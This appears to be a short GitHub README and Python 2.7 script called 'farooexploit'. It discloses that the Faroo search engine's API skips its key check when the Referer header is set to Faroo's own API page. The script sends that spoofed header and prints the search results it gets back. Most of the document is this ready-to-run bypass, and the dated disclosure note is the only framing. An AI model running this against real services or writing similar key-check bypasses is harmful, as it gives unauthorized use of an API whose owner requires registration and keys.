# farooexploit
Faroo is a web directory, similar to google, duckduckgo, yahoo, etc.

It has an API, that let's you do web searches, inside your program. In order to use the API, which is free, you have register for an API key. Even so, your API key might expire/get limited, after a certain while.

By manipulating the referer, you can use faroo's API, without the need of an API key.

Webmaster notified: Sept 2015
Public disclosure: 02 November 2016


#!/usr/bin/python2.7

# getyourbots.com
# The server should respond with 401
# If the referer is set as being the "right" one, it will respond with 
# 200 and the information you asked for

import requests as req
import sys
import json

REFERER = 'http://www.faroo.com/hp/api/api.html'

def main():
	if len(sys.argv) < 2:
		print '[!] Argument mising.'
		print '[+] Usage: ./exploit.py flowers'
		return
	
	kw = sys.argv[1]
	
	url = 'http://www.faroo.com/api?q={0}&start=1&length=50&l=en&src=web&f=json'.format(kw)
	h = {'Referer':REFERER}
	r = req.get(url, headers=h)
	js = json.loads(r.text)
	
	for e in js['results']:
		print 'Title: ' + e['title']
		print 'Url: ' + e['url']
		print '----------------------------------------------------------'

if __name__ == '__main__':
	main()

